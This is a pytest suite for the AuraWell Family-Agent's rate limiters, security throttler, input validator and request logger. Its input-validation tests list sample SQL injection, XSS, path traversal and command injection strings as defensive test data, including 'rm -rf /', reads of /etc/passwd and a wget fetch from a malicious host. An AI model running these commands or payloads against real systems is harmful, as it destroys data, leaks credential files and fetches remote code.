"""
Comprehensive Rate Limiting and Security Testing for AuraWell Family-Agent

Tests API rate limiting, request throttling, security injection prevention,
and abuse protection mechanisms.
"""

import pytest
import asyncio
import time
from unittest.mock import AsyncMock, MagicMock, patch
from datetime import datetime, timezone, timedelta
from typing import Dict, Any, List

from src.aurawell.core.rate_limiting import (
    RateLimiter,
    TokenBucket,
    SlidingWindowRateLimiter,
    UserRateLimiter,
    FamilyRateLimiter,
    RateLimitExceeded,
    SecurityThrottler,
)
from src.aurawell.core.security import (
    InputValidator,
    SQLInjectionDetector,
    XSSProtector,
    CSRFProtector,
    RequestLogger,
)
from src.aurawell.core.exceptions import AurawellException, SecurityViolationError


class TestTokenBucketRateLimiter:
    """Test token bucket rate limiting algorithm"""

    @pytest.fixture
    def token_bucket(self):
        """Create TokenBucket instance for testing"""
        return TokenBucket(
            capacity=10,  # 10 tokens max
            refill_rate=2,  # 2 tokens per second
            refill_interval=1.0,  # Refill every second
        )

    def test_token_bucket_initialization(self, token_bucket):
        """Test token bucket initialization"""
        assert token_bucket.capacity == 10
        assert token_bucket.refill_rate == 2
        assert token_bucket.tokens == 10  # Starts full
        assert token_bucket.last_refill <= time.time()

    def test_token_consumption_success(self, token_bucket):
        """Test successful token consumption"""
        # Should succeed - bucket starts full
        assert token_bucket.consume(5) is True
        assert token_bucket.tokens == 5

        # Should succeed - still have tokens
        assert token_bucket.consume(3) is True
        assert token_bucket.tokens == 2

    def test_token_consumption_failure(self, token_bucket):
        """Test token consumption failure when insufficient tokens"""
        # Consume all tokens
        token_bucket.consume(10)
        assert token_bucket.tokens == 0

        # Should fail - no tokens left
        assert token_bucket.consume(1) is False
        assert token_bucket.tokens == 0

    def test_token_refill_mechanism(self, token_bucket):
        """Test token refill over time"""
        # Consume all tokens
        token_bucket.consume(10)
        assert token_bucket.tokens == 0

        # Simulate time passage for refill
        token_bucket.last_refill = time.time() - 2.0  # 2 seconds ago
        token_bucket.refill()

        # Should have refilled 4 tokens (2 tokens/sec * 2 sec)
        assert token_bucket.tokens == 4

    def test_token_refill_cap_at_capacity(self, token_bucket):
        """Test that refill doesn't exceed capacity"""
        # Start with some tokens
        token_bucket.tokens = 8

        # Simulate long time passage
        token_bucket.last_refill = time.time() - 10.0  # 10 seconds ago
        token_bucket.refill()

        # Should cap at capacity (10), not exceed it
        assert token_bucket.tokens == 10


class TestSlidingWindowRateLimiter:
    """Test sliding window rate limiting algorithm"""

    @pytest.fixture
    def sliding_window_limiter(self):
        """Create SlidingWindowRateLimiter instance"""
        return SlidingWindowRateLimiter(
            max_requests=5, window_size=60  # 5 requests max  # Per 60 seconds
        )

    def test_sliding_window_initialization(self, sliding_window_limiter):
        """Test sliding window limiter initialization"""
        assert sliding_window_limiter.max_requests == 5
        assert sliding_window_limiter.window_size == 60
        assert len(sliding_window_limiter.request_times) == 0

    def test_request_within_limit(self, sliding_window_limiter):
        """Test requests within rate limit"""
        # Add 3 requests - should all succeed
        for i in range(3):
            assert sliding_window_limiter.is_allowed() is True

        assert len(sliding_window_limiter.request_times) == 3

    def test_request_exceeds_limit(self, sliding_window_limiter):
        """Test requests exceeding rate limit"""
        # Add maximum requests
        for i in range(5):
            assert sliding_window_limiter.is_allowed() is True

        # Next request should be denied
        assert sliding_window_limiter.is_allowed() is False

    def test_sliding_window_cleanup(self, sliding_window_limiter):
        """Test cleanup of old requests outside window"""
        # Add requests with old timestamps
        old_time = time.time() - 120  # 2 minutes ago (outside 60s window)
        sliding_window_limiter.request_times = [old_time] * 5

        # New request should succeed after cleanup
        assert sliding_window_limiter.is_allowed() is True

        # Old requests should be cleaned up
        assert len(sliding_window_limiter.request_times) == 1


class TestUserRateLimiter:
    """Test user-specific rate limiting"""

    @pytest.fixture
    def user_rate_limiter(self):
        """Create UserRateLimiter instance"""
        return UserRateLimiter(
            requests_per_minute=10, requests_per_hour=100, burst_limit=20
        )

    @pytest.mark.asyncio
    async def test_user_rate_limiting_success(self, user_rate_limiter):
        """Test successful user rate limiting"""
        user_id = "user123"

        # Should allow requests within limit
        for i in range(5):
            assert await user_rate_limiter.is_allowed(user_id) is True

    @pytest.mark.asyncio
    async def test_user_rate_limiting_exceeded(self, user_rate_limiter):
        """Test user rate limiting when exceeded"""
        user_id = "user123"

        # Exhaust rate limit
        for i in range(10):
            await user_rate_limiter.is_allowed(user_id)

        # Next request should be denied
        with pytest.raises(RateLimitExceeded) as exc_info:
            await user_rate_limiter.check_rate_limit(user_id)

        assert "Rate limit exceeded" in str(exc_info.value)
        assert user_id in str(exc_info.value)

    @pytest.mark.asyncio
    async def test_different_users_independent_limits(self, user_rate_limiter):
        """Test that different users have independent rate limits"""
        user1 = "user123"
        user2 = "user456"

        # Exhaust limit for user1
        for i in range(10):
            await user_rate_limiter.is_allowed(user1)

        # user2 should still be allowed
        assert await user_rate_limiter.is_allowed(user2) is True

    @pytest.mark.asyncio
    async def test_burst_limit_protection(self, user_rate_limiter):
        """Test burst limit protection"""
        user_id = "user123"

        # Try to make burst requests
        burst_requests = []
        for i in range(25):  # Exceed burst limit of 20
            try:
                result = await user_rate_limiter.is_allowed(user_id)
                burst_requests.append(result)
            except RateLimitExceeded:
                break

        # Should have stopped before allowing all 25 requests
        assert len(burst_requests) <= 20


class TestFamilyRateLimiter:
    """Test family-specific rate limiting"""

    @pytest.fixture
    def family_rate_limiter(self):
        """Create FamilyRateLimiter instance"""
        return FamilyRateLimiter(
            family_requests_per_minute=50, member_requests_per_minute=10
        )

    @pytest.mark.asyncio
    async def test_family_aggregate_rate_limiting(self, family_rate_limiter):
        """Test family aggregate rate limiting"""
        family_id = "family123"

        # Multiple users in same family
        users = ["user1", "user2", "user3"]

        # Each user makes requests
        total_requests = 0
        for user in users:
            for i in range(15):  # 15 requests per user = 45 total
                if await family_rate_limiter.is_allowed(user, family_id):
                    total_requests += 1
                else:
                    break

        # Should be limited by family aggregate limit (50)
        assert total_requests <= 50

    @pytest.mark.asyncio
    async def test_individual_member_rate_limiting(self, family_rate_limiter):
        """Test individual member rate limiting within family"""
        family_id = "family123"
        user_id = "user123"

        # Single user exceeds individual limit
        requests_allowed = 0
        for i in range(15):  # Try 15 requests (limit is 10)
            if await family_rate_limiter.is_allowed(user_id, family_id):
                requests_allowed += 1
            else:
                break

        # Should be limited by individual member limit (10)
        assert requests_allowed <= 10


class TestSecurityThrottler:
    """Test security-based request throttling"""

    @pytest.fixture
    def security_throttler(self):
        """Create SecurityThrottler instance"""
        return SecurityThrottler(
            suspicious_threshold=5,
            block_duration=300,  # 5 minutes
            escalation_factor=2.0,
        )

    @pytest.mark.asyncio
    async def test_suspicious_activity_detection(self, security_throttler):
        """Test detection of suspicious activity patterns"""
        user_id = "user123"

        # Simulate suspicious requests
        for i in range(6):  # Exceed threshold of 5
            await security_throttler.record_suspicious_activity(
                user_id, "invalid_login_attempt"
            )

        # User should be blocked
        assert await security_throttler.is_blocked(user_id) is True

    @pytest.mark.asyncio
    async def test_escalating_block_duration(self, security_throttler):
        """Test escalating block duration for repeat offenders"""
        user_id = "user123"

        # First offense
        await security_throttler.block_user(user_id, "first_offense")
        first_duration = security_throttler.get_block_duration(user_id)

        # Second offense (after unblocking)
        await security_throttler.unblock_user(user_id)
        await security_throttler.block_user(user_id, "second_offense")
        second_duration = security_throttler.get_block_duration(user_id)

        # Second duration should be longer
        assert second_duration > first_duration

    @pytest.mark.asyncio
    async def test_automatic_unblocking(self, security_throttler):
        """Test automatic unblocking after duration expires"""
        user_id = "user123"

        # Block user with short duration for testing
        security_throttler.block_duration = 0.1  # 0.1 seconds
        await security_throttler.block_user(user_id, "test_block")

        assert await security_throttler.is_blocked(user_id) is True

        # Wait for block to expire
        await asyncio.sleep(0.2)

        # Should be automatically unblocked
        assert await security_throttler.is_blocked(user_id) is False


class TestInputValidator:
    """Test input validation and sanitization"""

    @pytest.fixture
    def input_validator(self):
        """Create InputValidator instance"""
        return InputValidator()

    def test_sql_injection_detection(self, input_validator):
        """Test SQL injection pattern detection"""
        malicious_inputs = [
            "'; DROP TABLE users; --",
            "1' OR '1'='1",
            "admin'--",
            "1; DELETE FROM families WHERE 1=1; --",
            "UNION SELECT * FROM users",
        ]

        for malicious_input in malicious_inputs:
            with pytest.raises(SecurityViolationError) as exc_info:
                input_validator.validate_sql_safe(malicious_input)
            assert "SQL injection" in str(exc_info.value)

    def test_xss_prevention(self, input_validator):
        """Test XSS attack prevention"""
        xss_inputs = [
            "<script>alert('xss')</script>",
            "javascript:alert('xss')",
            "<img src=x onerror=alert('xss')>",
            "<iframe src='javascript:alert(\"xss\")'></iframe>",
            "onload=alert('xss')",
        ]

        for xss_input in xss_inputs:
            sanitized = input_validator.sanitize_html(xss_input)
            assert "<script>" not in sanitized
            assert "javascript:" not in sanitized
            assert "onerror=" not in sanitized

    def test_path_traversal_prevention(self, input_validator):
        """Test path traversal attack prevention"""
        traversal_inputs = [
            "../../../etc/passwd",
            "..\\..\\windows\\system32\\config\\sam",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "....//....//....//etc/passwd",
        ]

        for traversal_input in traversal_inputs:
            with pytest.raises(SecurityViolationError) as exc_info:
                input_validator.validate_path_safe(traversal_input)
            assert "Path traversal" in str(exc_info.value)

    def test_command_injection_prevention(self, input_validator):
        """Test command injection prevention"""
        command_inputs = [
            "; rm -rf /",
            "| cat /etc/passwd",
            "&& wget malicious.com/script.sh",
            "`whoami`",
            "$(cat /etc/passwd)",
        ]

        for command_input in command_inputs:
            with pytest.raises(SecurityViolationError) as exc_info:
                input_validator.validate_command_safe(command_input)
            assert "Command injection" in str(exc_info.value)

    def test_valid_input_passes_validation(self, input_validator):
        """Test that valid inputs pass validation"""
        valid_inputs = [
            "John Doe",
            "user@example.com",
            "My Family Name",
            "A normal description with spaces and punctuation.",
            "123456789",
        ]

        for valid_input in valid_inputs:
            # Should not raise exceptions
            input_validator.validate_sql_safe(valid_input)
            sanitized = input_validator.sanitize_html(valid_input)
            assert sanitized == valid_input  # Should be unchanged


class TestRequestLogger:
    """Test request logging for security monitoring"""

    @pytest.fixture
    def request_logger(self):
        """Create RequestLogger instance"""
        return RequestLogger()

    @pytest.mark.asyncio
    async def test_request_logging(self, request_logger):
        """Test basic request logging"""
        with patch.object(request_logger, "logger") as mock_logger:
            await request_logger.log_request(
                user_id="user123",
                endpoint="/api/v1/families",
                method="POST",
                ip_address="192.168.1.1",
                user_agent="TestAgent/1.0",
            )

            mock_logger.info.assert_called_once()
            log_message = mock_logger.info.call_args[0][0]
            assert "user123" in log_message
            assert "/api/v1/families" in log_message
            assert "POST" in log_message

    @pytest.mark.asyncio
    async def test_suspicious_request_logging(self, request_logger):
        """Test logging of suspicious requests"""
        with patch.object(request_logger, "security_logger") as mock_security_logger:
            await request_logger.log_suspicious_request(
                user_id="user123",
                endpoint="/api/v1/admin",
                reason="Unauthorized access attempt",
                details={"ip": "192.168.1.1", "attempts": 5},
            )

            mock_security_logger.warning.assert_called_once()
            log_message = mock_security_logger.warning.call_args[0][0]
            assert "SUSPICIOUS" in log_message
            assert "user123" in log_message
            assert "Unauthorized access attempt" in log_message

    @pytest.mark.asyncio
    async def test_rate_limit_violation_logging(self, request_logger):
        """Test logging of rate limit violations"""
        with patch.object(request_logger, "security_logger") as mock_security_logger:
            await request_logger.log_rate_limit_violation(
                user_id="user123",
                endpoint="/api/v1/families",
                limit_type="user_requests_per_minute",
                current_count=15,
                limit=10,
            )

            mock_security_logger.warning.assert_called_once()
            log_message = mock_security_logger.warning.call_args[0][0]
            assert "RATE_LIMIT_EXCEEDED" in log_message
            assert "user123" in log_message
            assert "15/10" in log_message


class TestConcurrentRateLimiting:
    """Test rate limiting under concurrent load"""

    @pytest.mark.asyncio
    async def test_concurrent_rate_limit_accuracy(self):
        """Test rate limiting accuracy under concurrent requests"""
        rate_limiter = UserRateLimiter(requests_per_minute=10)
        user_id = "user123"

        async def make_request():
            try:
                return await rate_limiter.is_allowed(user_id)
            except RateLimitExceeded:
                return False

        # Make 20 concurrent requests (should only allow 10)
        tasks = [make_request() for _ in range(20)]
        results = await asyncio.gather(*tasks)

        allowed_count = sum(1 for result in results if result is True)

        # Should allow approximately the rate limit (within small margin for concurrency)
        assert 8 <= allowed_count <= 12

    @pytest.mark.asyncio
    async def test_rate_limiter_thread_safety(self):
        """Test rate limiter thread safety"""
        rate_limiter = TokenBucket(capacity=100, refill_rate=10)

        async def consume_tokens():
            return rate_limiter.consume(1)

        # Make many concurrent token consumption requests
        tasks = [consume_tokens() for _ in range(150)]
        results = await asyncio.gather(*tasks)

        successful_consumptions = sum(1 for result in results if result is True)

        # Should not exceed bucket capacity
        assert successful_consumptions <= 100


@pytest.fixture
def sample_rate_limiting_data():
    """Fixture providing sample data for rate limiting tests"""
    return {
        "user_id": "user123",
        "family_id": "family123",
        "ip_address": "192.168.1.1",
        "user_agent": "TestAgent/1.0",
        "endpoint": "/api/v1/families",
        "method": "POST",
    }
